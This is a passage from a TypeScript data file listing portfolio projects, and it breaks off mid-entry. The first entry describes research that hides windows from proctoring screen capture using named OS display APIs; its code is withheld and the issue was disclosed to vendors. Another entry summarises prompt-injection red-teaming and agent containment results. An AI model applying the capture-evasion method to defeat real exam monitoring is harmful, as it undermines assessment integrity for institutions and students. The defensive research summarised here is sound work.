export interface ProjectPaper {
  title: string;
  label: string;
  href: string;
  kind: "download" | "external";
  venue?: string;
  year?: string;
  status?: string;
  description?: string;
  doi?: string;
}

export interface Project {
  slug: string;
  title: string;
  category: "OFFENSIVE" | "DEFENSIVE" | "ENGINEERING";
  year: string;
  // Optional ISO date of the last meaningful content update for THIS project.
  // Drives sitemap `lastModified` + JSON-LD `dateModified`; falls back to the
  // site-level revision date when absent, so builds don't fake per-page freshness.
  updatedAt?: string;
  description: string;
  fullDescription: string;
  tags: string[];
  links: {
    demo?: string;
    repo?: string;
    // A private source URL identifies the repository without promising public access.
    repoVisibility?: "public" | "private";
    caseStudy?: string;
    paper?: string;
    doi?: string;
    doiKind?: "software" | "publication";
    preprint?: string;
  };
  papers?: ProjectPaper[];
  citation?: string;
  build: {
    stack: string[];
    features: string[];
  };
  secure: {
    measures: string[];
  };
  problem: string;
  solution: string[];
  proof: string[];
}

export const projects: Record<string, Project> = {
  "invisible-window-research": {
    slug: "invisible-window-research",
    title: "Invisible Window Research",
    category: "OFFENSIVE",
    year: "2026",
    description:
      "IEEE-format research paper exposing a structural vulnerability in WebRTC-based exam proctoring. 100% evasion in tested Windows 10/11 and macOS 14–26 lab configurations using documented OS display APIs. Responsibly disclosed to vendors.",
    tags: [
      "Security Research",
      "Windows",
      "macOS",
      "WebRTC",
      "Responsible Disclosure",
      "PoC",
    ],
    links: {
      repo: "https://github.com/Raoof128/invisible-window-research",
      paper: "/Invisible_Window_Research_Preprint_V2.0.pdf",
      preprint: "https://zenodo.org/records/20376495",
      caseStudy: "/projects/invisible-window-research",
    },
    papers: [
      {
        title:
          "The Invisible Window: Exploiting OS-Level Display Affinity to Bypass WebRTC Proctoring Systems",
        label: "IEEE-format preprint",
        href: "/Invisible_Window_Research_Preprint_V2.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "CC BY 4.0 preprint",
        description:
          "13-page research paper documenting cross-platform screen-capture evasion and coordinated vendor disclosure.",
        doi: "10.5281/zenodo.20376495",
      },
    ],
    citation:
      "Abedini, M. R. (2026). The Invisible Window: Exploiting OS-Level Display Affinity to Bypass WebRTC Proctoring Systems. Zenodo. https://doi.org/10.5281/zenodo.20376495",
    build: {
      stack: [
        "Win32 C (Windows PoC)",
        "Swift / AppKit (macOS PoC)",
        "Python (pixel-level forensic verification)",
        "LaTeX (IEEE conference template, 13 pages, 53 references)",
      ],
      features: [
        "SetWindowDisplayAffinity + WDA_EXCLUDEFROMCAPTURE (Windows 10 v2004+): excludes the window from tested Windows screen-capture paths with zero visual artefact",
        "NSWindow.SharingType.none (macOS 14–26): exclusion was demonstrated in tested native capture paths. macOS 26 used CGWindowListCreateImage and screencapture, not browser getDisplayMedia() or a direct ScreenCaptureKit test",
        "Pixel-level forensic verification: 80.27% pixel difference in Windows capture footprint; 1,170,560-pixel macOS capture returned fully transparent",
      ],
    },
    secure: {
      measures: [
        "Discovery and verification (January 2026)",
        "Microsoft MSRC was notified in February 2026 and classified the issue as by-design, not a security vulnerability, in April 2026",
        "Apple Product Security was notified in March 2026 and classified the behavior as by design, not a security issue, that month",
        "Public release following OS vendor responses (May 2026)",
        "Proof-of-concept code is withheld on dual-use grounds",
        "Uses documented, user-level OS APIs. No kernel exploits or privilege escalation are involved",
        "Aligned with ACM and IEEE codes of ethics and CISA coordinated disclosure guidelines",
      ],
    },
    fullDescription:
      "A 13-page IEEE-format research paper documenting a structural vulnerability in WebRTC-based exam proctoring. Operating systems expose documented APIs, SetWindowDisplayAffinity on Windows and NSWindow.SharingType.none on macOS, that let an application exclude its window from tested screen-capture paths while remaining fully visible on the physical display. This challenges the trust assumption in capture-based proctoring. Proof-of-concept implementations achieved 100% evasion across tested Windows and macOS lab configurations, including macOS 26 where the attack was previously assumed mitigated. Configurations were simulated, not commercial proctoring products; macOS 26 used native CGWindowListCreateImage and screencapture rather than browser getDisplayMedia(), and Linux was not tested. Findings reflect the tested software versions as of March 2026 and may change after patches.",
    problem:
      "Remote proctoring systems detect prohibited content by capturing the student's screen via the WebRTC getDisplayMedia() API. The implicit security assumption is that the captured frame faithfully represents the physical display. The research demonstrates a gap in that assumption: documented OS display APIs excluded windows in tested capture paths without privilege escalation or kernel modification. These findings concern controlled, simulated Windows and macOS configurations; they do not establish bypass of every browser or commercial proctoring product.",
    solution: [
      "Formalised the trust-boundary violation between the W3C Screen Capture API and the OS compositing pipeline",
      "Surveyed SetWindowDisplayAffinity (Win32) and NSWindow.SharingType.none (macOS); both appear in official SDK references",
      "Built proof-of-concept implementations in Win32 C (Windows) and Swift (macOS) demonstrating full screen-capture evasion",
      "Evaluated simulated proctoring configurations in a controlled lab on Windows 10/11 and macOS 14–26; no commercial products were tested, and macOS 26 used native capture rather than browser getDisplayMedia()",
      "Analysed which behavioural detection mechanisms (gaze tracking, mouse dynamics, process enumeration) can and cannot detect the attack",
      "Proposed and assessed five countermeasures, ranging from deployable (flag enumeration) to long-term (hardware attestation)",
      "Coordinated OS vendor disclosure: Microsoft MSRC (notified Feb 2026, classified Apr 2026) and Apple Product Security (notified and classified Mar 2026) both issued formal classifications",
    ],
    proof: [
      "100% evasion rate across Windows 10/11 and macOS 14–26, measured over 10,000+ frames per configuration",
      "Zero visual artefacts detected in captured frames (no black rectangles, compositing errors, or flicker)",
      "Window exclusion remained effective in tested native capture paths on macOS 26.3.1 despite Apple's documented ScreenCaptureKit changes in macOS 15; no direct ScreenCaptureKit or browser getDisplayMedia() test was performed on macOS 26",
      "Linux (X11/Wayland) was not evaluated; these results apply to the tested Windows and macOS configurations",
      "Behavioural detection showed no significant effect at this sample size. Gaze tracking (p = 0.41, n = 8) was underpowered, and mouse dynamics fell within normal exam-behaviour variance. This does not establish that behavioural detection is impossible in all settings",
      "Published as a Zenodo preprint under CC BY 4.0 (DOI 10.5281/zenodo.20376495), with 13 pages, 53 references, and IEEE conference formatting",
    ],
    updatedAt: "2026-11-09",
  },
  "project-simurgh": {
    slug: "project-simurgh",
    title: "Project Simurgh",
    category: "DEFENSIVE",
    year: "2026",
    description:
      "Inspectable authorisation and containment prototype for tool-using AI agents. October 2026 matched-control study: Llama-3.2-3B restricted trials with new effects fell from 17/24 to 0/24, with 23/24 useful completions. The gpt-6-luna baseline was already 0/24, so no incremental protection was observed there.",
    tags: [
      "Containment Attestation",
      "Agentic AI Safety",
      "Prompt-Injection",
      "Ed25519",
      "LLM Red-Teaming",
      "AGPL-3.0",
    ],
    links: {
      repo: "https://github.com/Raoof128/Project-Simurgh",
      caseStudy: "/projects/project-simurgh",
      doi: "https://doi.org/10.5281/zenodo.21737792",
      doiKind: "software",
    },
    papers: [
      {
        title:
          "Project Simurgh: Privacy-Preserving Device Integrity Proofs for Capture-Resistant High-Stakes Sessions",
        label: "Earlier device-integrity preprint",
        href: "/Project_Simurgh_Preprint_v1.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "CC BY 4.0 preprint",
        description:
          "12-page defensive follow-up to The Invisible Window, replacing visual surveillance with metadata-only integrity proofs.",
        doi: "10.5281/zenodo.20374849",
      },
      {
        title:
          "Privacy-Preserving Integrity Evidence for Student-Society Voting-Adjacent Workflows: A Phase C Pilot of Project Simurgh at Macquarie University",
        label: "Supplement preprint",
        href: "/Project_Simurgh_Voting_Adjacent_Supplement_Phase_C_Preprint_v1.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Phase C preprint",
        description:
          "5-page voting-adjacent pilot reporting 31 consented sessions alongside a Macquarie student-society event, with ballot-choice exclusion, HMAC audit chaining, forbidden-field rejection, and 5/5 collection-closure gates.",
        doi: "10.5281/zenodo.20549736",
      },
      {
        title:
          "Banking Shield: Machine-Checked Absence Claims for Privacy-Sensitive AI Explanations",
        label: "Banking-adjacent preprint",
        href: "/Banking_Shield_Machine_Checked_Absence_Claims_Preprint_v1.2.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Author-prepared preprint",
        description:
          "Fictional, non-bank research prototype that turns privacy and overclaim boundaries into machine-checkable evidence: a 46-name forbidden-field firewall whose rejections become audit events, a deterministic offline AI privacy firewall, and per-response privacy receipts anchored in per-session HMAC audit chains. At the evidence freeze all 417/417 unit tests, 43/43 end-to-end checks, and 27/27 security checks passed across three privacy audits and a no-egress static gate, with a formative five-tester dry run (30 sessions) recording zero sensitive values in evidence and 5/5 non-claim checklist comprehension.",
        doi: "10.5281/zenodo.20675513",
      },
    ],
    citation:
      "Abedini, M. R. (2026). Project Simurgh: Privacy-Preserving Device Integrity Proofs for Capture-Resistant High-Stakes Sessions. Zenodo. https://doi.org/10.5281/zenodo.20374849",
    build: {
      stack: [
        "Python 3.12 composed authorisation controls and replay harnesses",
        "React evidence explorer and shared JSON CLI",
        "Ed25519-signed evidence archives that replay offline in one command",
        "OpenAI Responses API with tool calling",
        "Self-hosted Llama-3.2-3B / Llama-3.3-70B",
        "Lean 4 models of selected properties",
        "Earlier frozen containment gateway (Node.js / JavaScript)",
      ],
      features: [
        "Host-held delegation, stop, lease and credential state is checked outside the model for every tool proposal",
        "Matched credential-only, composed and deny-all controls separate host-control effects from the model baseline and useful-task outcomes",
        "Built the work to be reproduced: Ed25519-signed evidence archives replay offline in one command",
        "Earlier frozen architecture used four containment boundaries: input firewall, context-provenance guard, tool-invocation gate and output-leakage firewall",
      ],
    },
    secure: {
      measures: [
        "Host-side state checks govern permitted tool proposals; the prototype and small experiments do not establish a universal safety guarantee",
        "Positive and null model results are published together, with state-cluster uncertainty and the part of the gap that holds by construction made explicit",
        "OpenAI role-placement failure and the frozen correction remain visible; one authorised-workflow refusal is still open",
        "39 Lean 4 proofs sit behind a gate that fails on any unproven “sorry” placeholder",
        "Earlier frozen containment evidence complements input classifiers; it is not a general jailbreak detector or proof that all unsafe model outputs are prevented",
      ],
    },
    fullDescription:
      "Project Simurgh is a sole-author, open-source research prototype for inspecting what an AI agent is permitted to do. Delegation, stop, lease and credential state are held on the host; each tool proposal is checked against that state outside the model. Its Ed25519-signed evidence archives replay offline in one command. Its October 2026 transfer study reports a benefit on one model and a null result on another. Earlier classifier-miss and AgentDojo results remain separate frozen experiments, while the original device-integrity preprint records the project’s earlier research lineage.",
    problem:
      "A tool-using agent may propose actions after its delegation, stop, lease or credential state has changed. Host controls need to enforce that state outside the model. Evaluating those controls also requires matched baselines, useful-task outcomes and uncertainty reporting: an already-clean model baseline cannot demonstrate additional protection.",
    solution: [
      "Holds delegation, stop, lease and credential state on the host and checks every tool proposal outside the model; Ed25519-signed evidence archives replay offline in one command",
      "October 2026 transfer study: 24 tasks, two trials each, three matched controls (credential-only, composed, deny-all), two models and 288 replayed branches; protocol to published package took 15–17 October 2026",
      "On Meta Llama-3.2-3B, composed host controls cut restricted-state trials with new effects from 17/24 to 0/24, retained 23/24 useful completions and blocked no valid proposal",
      "On OpenAI gpt-6-luna the baseline was already 0/24; the study reports no incremental protection on that model",
      "Reports uncertainty per state: 24 restricted trials form six states; Wilson 95% intervals are 43.6–97.0% versus 0.0–39.0%, and part of the gap holds by construction",
    ],
    proof: [
      "October 2026 matched-control transfer study: 24 tasks × two trials × three controls × two models; 288 replayed branches. The positive Llama-3.2-3B result and null gpt-6-luna result are reported together",
      "Llama-3.2-3B: restricted-state trials with new effects 17/24 → 0/24, useful completions 23/24, no valid proposal blocked; gpt-6-luna: baseline 0/24, no observed incremental protection",
      "Cluster scope: the 24 restricted trials occupy six states. Per-state Wilson 95% intervals are 43.6–97.0% versus 0.0–39.0%; part of the difference holds by construction",
      "OpenAI Responses API integration defect: a role-placement error caused 8/8 workflow declines. Original traces were retained; a frozen developer-role correction completed 2/3 authorised workflows and declined 5/5 restricted workflows, with one refusal still open",
      "Earlier frozen classifier stage (2026): real Llama Guard 4 12B over 180 cases; containment evidence covered all 138/138 malicious cases it missed, including 120 downstream injections outside an input-only classifier’s view. This is a coverage claim, not a classifier ranking",
      "Reduced a live Llama-3.3-70B agent's targeted attack success on AgentDojo from 9/140 to 0/140 over pre-registered injections in the workspace suite (frozen stage, 2026); the full four-suite deterministic run scored 0/949 attack success with 949/949 unattacked utility (both scoped as small experiments)",
      "Built the work to be reproduced: Ed25519-signed evidence archives replay offline in one command; 39 Lean 4 proofs sit behind a gate that fails on any unproven “sorry” placeholder; 5,171 tests passed in the 19 October 2026 smoke run; 92 releases. The root package declares AGPL-3.0-or-later",
      "Audited 919 of the project's own documents and published all 141 dated findings, including overstatements in earlier closeouts, in the README",
      "Current software archive DOI 10.5281/zenodo.21737792 is separate from the original device-integrity preprint DOI 10.5281/zenodo.20374849 and the other published preprints",
    ],
    updatedAt: "2026-11-09",
  },
  "project-zurvan": {
    slug: "project-zurvan",
    title: "Project Zurvan",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Local-first document knowledge engine with Python ingestion, SQLite FTS5/vector retrieval and a Rust MCP stdio server backed by Python writes. Current sealed-evaluation work remains open.",
    tags: [
      "Python",
      "Rust",
      "LLM",
      "MCP",
      "Knowledge Graph",
      "SQLite",
      "Local-first",
      "AI Agents",
    ],
    links: {
      repo: "https://github.com/Raoof128/Project-Zurvan",
      repoVisibility: "public",
      caseStudy: "/projects/project-zurvan",
    },
    build: {
      stack: [
        "Python 3.10+ ingestion and write bridge",
        "Rust native MCP server; Python reference and fallback",
        "SQLite FTS5 + sqlite-vec 0.1.6",
        "Local MiniLM embeddings for semantic retrieval",
        "MCP stdio: 15 tools, 7 resources and 4 prompts",
        "OpenAI / Anthropic / Ollama / Mock LLM providers",
        "Obsidian-compatible vault layout",
      ],
      features: [
        "Ingests Markdown, text-bearing PDF and TXT into a linked, searchable wiki; images become pending-visual stubs, with no automatic OCR or visual extraction",
        "The LLM extraction layer produces typed claims, concepts, entities and decisions; unextracted sources and untranscribed PDF figures remain explicitly marked",
        "Hybrid FTS5 + local semantic retrieval and graph-neighbour expansion assemble context bundles with index/ledger freshness stamps",
        "The Rust MCP stdio server serves native reads; writes and evaluation use a Python bridge, preserving the reference implementation and opt-in write boundary",
        "Multi-project federation supports registered cross-vault search, contradiction detection and policy monitoring",
        "Serves claims and decisions to agents over MCP; 218 tests",
      ],
    },
    secure: {
      measures: [
        "Documents and local embedding retrieval stay on the configured store; LLM extraction can use local/mock or configured OpenAI/Anthropic providers, so external processing depends on the chosen provider",
        "MCP writes are disabled by default and require explicit opt-in; the read allow-list and raw-source restrictions apply to both Rust and Python servers",
        "User vault registrations live in ~/.zurvan/projects.json outside the project tree; publication and evidence output have separate local redaction boundaries",
        "Mock LLM provider available for safe dev/test without API key exposure",
        "Agent memory isolated per vault; cross-vault federation requires explicit registration",
      ],
    },
    fullDescription:
      "Project Zurvan is a local-first knowledge engine that turns supported text documents into a linked, searchable, git-friendly wiki and exposes it to agents through MCP. Python handles ingestion and authoritative writes; a native Rust server serves reads, with the Python server retained as reference and fallback. Hybrid retrieval uses SQLite FTS5, local embeddings and graph expansion. Images are tracked as pending-visual stubs rather than automatically interpreted. Its public repository includes ongoing sealed-evaluation research.",
    problem:
      "Agents need persistent, structured memory that preserves how claims, sources and decisions relate. A useful local-first system must also show when its index is stale, when source material has not been extracted, and what its retrieval evaluation has actually established.",
    solution: [
      "Built a Python ingestion pipeline for Markdown, text-bearing PDF and TXT; images create pending-visual stubs and PDF figures are marked untranscribed",
      "Extracts typed claims, concepts, entities and decisions into a linked wiki; authoritative writes pass through the knowledge ledger",
      "Combines SQLite FTS5, local semantic embeddings and graph-neighbour expansion, with explicit index/ledger freshness information",
      "Added a Rust MCP stdio read server with Python-backed writes and evaluation; the Python server remains the reference and fallback",
      "Federates explicitly registered vaults for cross-project search, decision memory, contradiction detection and policy monitoring",
    ],
    proof: [
      "Local-first knowledge engine serving claims and decisions to agents over MCP (218 tests)",
      "20 October Rust/Python live parity receipt: 314 cases per protocol, 312 PASS, 2 expected divergences and 0 FAIL on MCP 2025-11-25 and 2026-07-28; these are repository-reported measurements",
      "Obsidian-compatible vault with seven documented graph node types: claims, concepts, entities, decisions, sessions, contradictions and syntheses",
      "Evidence pack → report → review → publish can run locally; extraction’s network use still depends on the configured LLM provider",
      "The earlier 18-phase feature history is retained; subsequent retrieval, Rust MCP and sealed-evaluation work has its own dated records. Z1b was merged before closure and remains explicitly NOT CLOSED",
    ],
    updatedAt: "2026-11-09",
  },
  gitswitch: {
    slug: "gitswitch",
    title: "GitSwitch",
    category: "ENGINEERING",
    year: "2024",
    description:
      "Cross-platform Git client for multiple developer identities, repository review and AI-assisted commits, with cloud, local-model and offline generation modes.",
    tags: ["Electron", "React", "TypeScript", "AI", "Dev Tool"],
    links: {
      repo: "https://github.com/Raoof128/GitSwitch",
      caseStudy: "/projects/gitswitch",
    },
    build: {
      stack: [
        "Electron 39",
        "React 19",
        "TypeScript 5.9",
        "Zustand 5",
        "Gemini / OpenAI / Anthropic / local LLMs",
        "Vitest + Playwright",
      ],
      features: [
        "Multi-account SSH and Git identity management",
        "Commit generation through Gemini, OpenAI, Anthropic, local LLMs or offline heuristics",
        "Repository-aware diff viewer and GitHub/GitLab pull-request workflows",
        "Cloud-AI consent gate, optional diff redaction and bounded requests",
      ],
    },
    secure: {
      measures: [
        "Secrets encrypted at rest with Electron safeStorage; storage fails when encryption is unavailable",
        "Sandboxed renderer with context isolation and Node integration disabled",
        "Validated IPC boundaries, input limits and operation timeouts",
        "Cloud-AI consent and optional diff redaction; JavaScript reference clearing does not guarantee memory erasure",
      ],
    },
    fullDescription:
      "GitSwitch is a cross-platform Electron and React Git client for developers managing several identities and repositories. It combines SSH/account management, diff review, GitHub/GitLab workflows and configurable commit-message generation through cloud providers, local models or offline heuristics. Privileged operations and decrypted credentials are handled in the main process.",
    problem:
      "Developers managing personal and work repositories need consistent Git identities, useful diff review and deliberate control over the code sent to AI services.",
    solution: [
      "Built account and SSH management around global and repository-local Git identities",
      "Added interchangeable Gemini, OpenAI, Anthropic and local-model providers with an offline heuristic mode",
      "Separated the renderer from privileged main-process operations through a constrained IPC bridge",
      "Added explicit cloud-AI consent, optional diff redaction and repository-aware commit validation",
    ],
    proof: [
      "Pinned package manifest declares Electron ^39.2.6 and React ^19.2.1",
      "Source configures contextIsolation and sandbox on, with nodeIntegration off",
      "safeStorage encrypts credential files and refuses storage when encryption is unavailable",
      "Provider code implements cloud consent, local/offline choices and a configurable generation timeout",
    ],
    updatedAt: "2026-11-04",
  },
  "mehr-guard": {
    slug: "mehr-guard",
    title: "Mehr Guard",
    category: "DEFENSIVE",
    year: "2024",
    description:
      "Offline QR and URL phishing scanner in Kotlin Multiplatform: ensemble ML plus 25 heuristics at 87% F1 and under 5 ms, 19-scenario red-team mode.",
    tags: ["KMP", "Security Tool", "Android", "iOS", "Desktop", "Web"],
    links: {
      demo: "https://raoof128.github.io/dashboard.html",
      repo: "https://github.com/Raoof128/Raoof128.github.io",
      caseStudy: "/projects/mehr-guard",
    },
    build: {
      stack: [
        "Kotlin Multiplatform",
        "Compose Multiplatform",
        "SwiftUI",
        "ML Kit",
        "SQLDelight",
      ],
      features: [
        "5 Platform Targets (Android, iOS, JVM, JS, Wasm)",
        "Ensemble model: logistic regression, gradient boosting and decision rules",
        "Brand-impersonation, homograph-attack & malicious-redirect detection",
        "Heuristics engine (25 heuristics)",
        "19-scenario red-team mode",
      ],
    },
    secure: {
      measures: [
        "Local PhishingEngine analysis is designed without cloud URL lookups",
        "On-device ML and heuristic scoring",
        "Analysis does not require uploading the scanned URL",
        "Offline unit checks exercise completion, determinism and timing; network interception is not independently verified",
      ],
    },
    fullDescription:
      "Mehr Guard is an offline QR and URL phishing scanner in Kotlin Multiplatform, with native or browser interfaces across 5 targets: ensemble ML plus 25 heuristics at 87% F1 and under 5 ms, with a 19-scenario red-team mode.",
    problem:
      "QR codes are a common vector for phishing, but most scanners upload data to the cloud, compromising privacy. Users need a way to verify URLs without leaking their browsing history.",
    solution: [
      "Built a local URL-analysis core using Kotlin Multiplatform",
      "Combined ensemble ML (logistic regression, gradient boosting and decision rules) with 25 heuristics",
      "Targeted 5 platforms (Android, iOS, JVM, JS, Wasm); the repository reports ~100% shared detection logic (~52% of total code)",
      "Analysis completes in under 5 ms",
    ],
    proof: [
      "Ensemble ML plus 25 heuristics at 87% F1",
      "Under 5 ms analysis",
      "19-scenario red-team mode",
      "./judge/verify_offline.sh invokes shared-engine unit checks; these tests are not an independent capture of outbound network traffic",
      "Repository reports ~100% shared detection logic (~52% of total codebase)",
    ],
    updatedAt: "2026-11-09",
  },
  "syllabus-sync": {
    slug: "syllabus-sync",
    title: "Syllabus-Sync",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Macquarie University Incubator startup: a shared Next.js/TypeScript codebase that converts university syllabi into structured data. Raouf is cofounder and led the security backend; 503 tests across 92 files.",
    tags: [
      "MQ Incubator Startup",
      "Next.js 16",
      "Supabase",
      "TypeScript",
      "AI/LLM",
      "WebAuthn",
    ],
    links: {
      demo: "https://www.syllabus-sync.app/",
      repo: "https://github.com/Raoof128/Syllabus-Sync",
      caseStudy: "/projects/syllabus-sync",
    },
    build: {
      stack: [
        "Next.js 16 + React 19",
        "TypeScript 5",
        "Supabase PostgreSQL",
        "TanStack Query + Zustand",
        "Leaflet + Google Maps",
        "Framer Motion + Radix UI",
        "Cloudflare Workers / OpenNext",
        "Upstash Redis + Sentry",
      ],
      features: [
        "Academic planning, assessment deadlines, calendar, campus navigation and notifications",
        "Converts university syllabi into structured data",
        "Multi-profile student tools and institution-specific academic datasets",
        "503 tests across 92 files",
      ],
    },
    secure: {
      measures: [
        "Middleware protects configured page routes and non-public APIs, with explicit public exceptions and fail-closed handling of unresolved API authentication",
        "Supabase Row-Level Security and user-scoped database access",
        "WebAuthn/FIDO2 passkeys alongside supported password and MFA flows",
        "Schema validation, CSRF controls, audit logging and route-specific rate limiting",
        "Configured CI secret scanning",
      ],
    },
    fullDescription:
      "Syllabus-Sync is an independent student experience platform initially built for Macquarie University students, covering academic planning, assessment deadlines, campus navigation, notifications and profile management. Raouf is cofounder of this Macquarie University Incubator startup and led the security backend (WebAuthn passkeys, TOTP MFA, Postgres row-level security, tamper-resistant audit logging) of its shared Next.js/TypeScript codebase, which converts university syllabi into structured data; 503 tests across 92 files.",
    problem:
      "Students need a consistent place for assessment deadlines, academic planning and campus information, with account security and clear boundaries around personal data.",
    solution: [
      "Co-founded the startup and led the security backend (WebAuthn passkeys, TOTP MFA, Postgres row-level security, tamper-resistant audit logging) of the shared Next.js/TypeScript codebase",
      "Implemented protected-route middleware, passkeys, MFA, user-scoped data access and audit controls",
      "Integrated planning, calendars, campus navigation and notifications around configurable academic datasets",
      "Converts university syllabi into structured data",
    ],
    proof: [
      "Macquarie University Incubator startup acceptance and co-founder role are recorded in the supplied résumé and profile",
      "503 tests across 92 files",
      "Deployed with Cloudflare Workers; current demo availability was not independently verified",
      "Middleware source returns 503 for unresolved protected API authentication and 401 for unauthenticated protected APIs",
      "Raouf led the security backend: WebAuthn passkeys, TOTP MFA, Postgres row-level security and tamper-resistant audit logging",
      "Passkeys use public-key credentials; this does not mean every supported authentication flow is passwordless",
    ],
    updatedAt: "2026-11-09",
  },
  "divan-open-day": {
    slug: "divan-open-day",
    title: "Divan — Open Day",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Bilingual English and Persian Hafez and Rumi poetry experience built for a Persian Society Open Day stall. Visitors receive a source-validated verse, translation, attribution and optional recitation. Offline use follows verified release caching; poem selections stay on-device, while hosting connection data has a separate privacy boundary.",
    tags: [
      "React 19",
      "Vite",
      "TypeScript",
      "Offline-First",
      "Privacy by Design",
      "i18n / RTL",
    ],
    links: {
      demo: "https://divan.raoufabedini.dev/",
      repo: "https://github.com/Raoof128/divan-open-day",
      caseStudy: "/projects/divan-open-day",
    },
    build: {
      stack: [
        "Vite",
        "React 19",
        "strict TypeScript",
        "Hand-written service worker",
        "Web Crypto (shuffle bag)",
        "Vitest (unit / component / a11y / offline)",
        "Playwright (Chromium e2e)",
        "pnpm 10.33 · Node 22.16",
      ],
      features: [
        "Source-validated bilingual corpus: exactly 60 Hafez + 60 Rumi = 120 records, bound to immutable editions and documented machine-verifiable provenance",
        "Verse selection uses a Web Crypto shuffle bag computed on-device, without server involvement",
        "Offline-first: a hand-written service worker with integrity verification keeps the stall running on flaky venue networks",
        "Culturally distinct art direction per poet with live Nastaliq typography (real Persian script, never rasterised images)",
        "Bilingual markup with directional text handling, bidirectional isolation, live regions, forced-colors and reduced-motion support",
      ],
    },
    secure: {
      measures: [
        "No visitor accounts or intention submission; poem choices stay on-device without an application database or tracking cookies",
        "Static client with no runtime backend, visitor database or application analytics endpoint; hosting providers may process limited technical connection data under their own settings",
        "sessionStorage holds only public release, poet and poem-selection state; the motion preference is stored locally in localStorage",
        "Production compiler rejects synthetic/test data before deployment",
        "Source-bound attribution with rights verification (MIT for code; poetry and translations retain their own licences, e.g. CC BY-SA)",
        "Static origin behind an outbound tunnel, with no host-published application ports",
      ],
    },
    fullDescription:
      "Divan is a bilingual Persian-poetry experience built for a Persian Society Open Day stall. A visitor selects Hafez or Rumi, holds an intention without submitting it, and receives a source-validated verse with its English translation, attribution and optional recitation. A verified, cached release supports offline use. The static application has no accounts, intention form, visitor database or analytics endpoint; limited connection data processed by the hosting provider and network edge remains a separate privacy boundary.",
    problem:
      "A public Open Day stall needs a fast cultural experience that works on unreliable venue Wi-Fi, avoids collecting visitor intentions or poem choices, and presents source-bound Persian poetry with clear attribution and live calligraphy. Engineering source checks must remain distinct from cultural-review sign-off and manual assistive-technology evidence.",
    solution: [
      "Compiled exactly 60 Hafez + 60 Rumi records (120 total), bound to immutable editions with documented, machine-verifiable source provenance",
      "Built an integrity-checked service worker so a verified, cached release remains usable without a network connection",
      "The Web Crypto shuffle bag selects verses on-device; no server records what visitors draw",
      "Rendered live Nastaliq typography and distinct Persian-miniature-inspired art direction for Hafez and Rumi instead of flattened calligraphy images",
      "Built accessibility in from the start: bilingual/RTL markup, bidirectional isolation, live regions, forced-colors and reduced-motion support",
    ],
    proof: [
      "Application code has no visitor form, tracking cookies, analytics endpoint or backend; sessionStorage holds only public release and poem-selection state",
      "Offline readiness is established by verified release and cache state, rather than assumed after every initial page load",
      "Production compilation rejects synthetic fixtures and requires source-bound corpus evidence; the dated July 2026 report records 60 Hafez + 60 Rumi records",
      "Configured Vitest suites cover unit, component, accessibility, offline, share, performance and security checks, with Playwright Chromium e2e; these are engineering checks, not cultural or manual assistive-technology certification",
    ],
    updatedAt: "2026-11-04",
  },
  "nexus-archive": {
    slug: "nexus-archive",
    title: "Nexus Archive",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Cyberpunk-styled personal media vault and job tracker with React, Litestar and Supabase. AI-assisted recommendations, persistent chat, configured Fernet encryption for takeaway notes, and backend-issued auth cookies with a refresh flow.",
    tags: ["React", "Python", "Litestar", "Supabase", "AI", "Full-Stack"],
    links: {
      demo: "https://home-notes-app.uk/",
      repo: "https://github.com/Raoof128/Nexus_Archive",
      caseStudy: "/projects/nexus-archive",
    },
    build: {
      stack: [
        "React 19",
        "Vite",
        "Tailwind CSS 4",
        "TanStack Query",
        "Python 3.12",
        "Litestar",
        "Supabase PostgreSQL",
        "Docker",
        "Terraform",
      ],
      features: [
        "AI-assisted media recommendations via Gemini with graceful degradation",
        "Persistent AI chat transcripts with user-scoped sanitisation and query-cache updates",
        "Status tracking, ratings and reviews for anime, movies and books, plus job-application tracking and job-aware suggestions",
        "Smart filtering and search across entire media library",
      ],
    },
    secure: {
      measures: [
        "Backend-issued HttpOnly SameSite=Strict auth cookies; login and refresh responses also expose access tokens to the frontend session",
        "Cookie-based /auth/refresh flow with silent client retry; short token lifetimes and secure-cookie settings require deployment configuration",
        "LLM input mitigations use XML delimiters, string scrubbing and pattern-based PII masking; these do not guarantee prompt-injection immunity or complete PII removal",
        "Fernet encryption for takeaway notes requires TAKEAWAY_ENCRYPTION_KEY; takeaway writes fail closed without the key, while chat encryption is conditional on that configuration",
        "CI configures Bandit, pip-audit, npm audit and secret scanning; configured checks are distinct from a passing current workflow result",
      ],
    },
    fullDescription:
      "Nexus Archive is a cyberpunk-styled personal media vault and job tracker combining a React frontend, a Litestar API and Supabase-backed identity and persistence. Manage books, movies, anime, job applications, ratings, takeaway notes, persistent chat sessions and AI-assisted recommendations from one dashboard. Takeaway writes require a configured Fernet key, and production cookie, token-lifetime and database controls depend on the documented deployment settings.",
    problem:
      "Media trackers split entertainment libraries across platforms and can have weak security controls. Nexus Archive brings titles, ratings, notes, and recommendations into one account with row-level access controls.",
    solution: [
      "Built a full-stack vault with React 19 + Litestar API backed by Supabase PostgreSQL with Row Level Security",
      "Implemented backend-issued HttpOnly SameSite=Strict cookies and a refresh flow; access tokens are also returned in frontend-readable session responses",
      "Integrated Gemini AI for media recommendations with shared per-user rate limiting and local fallback",
      "Added key-required Fernet encryption for takeaway notes and input scrubbing, XML context delimiters and pattern-based PII masking for model requests",
    ],
    proof: [
      "Auth code sets HttpOnly SameSite=Strict cookies and implements refresh rotation; production secure-cookie and token-lifetime settings require configuration",
      "CI definitions include Bandit, pip-audit, npm audit and gitleaks; the presence of these checks does not establish a passing HEAD run",
      "Locust scenarios exercise authenticated requests to the recommendation endpoint; no measured performance result is claimed",
      "Terraform IaC scaffold for reproducible Supabase + Vercel deployments",
    ],
    updatedAt: "2026-11-04",
  },
  nanomatch: {
    slug: "nanomatch",
    title: "NanoMatch",
    category: "ENGINEERING",
    year: "2026",
    description:
      "C++20 price-time matching engine with four order types and per-symbol books. The repository reports 9.29M mixed add/cancel operations per second in a single-thread synthetic Apple M-series Release benchmark.",
    tags: ["C++20", "CMake", "Google Test", "HFT", "Systems Programming"],
    links: {
      repo: "https://github.com/Raoof128/NanoMatch",
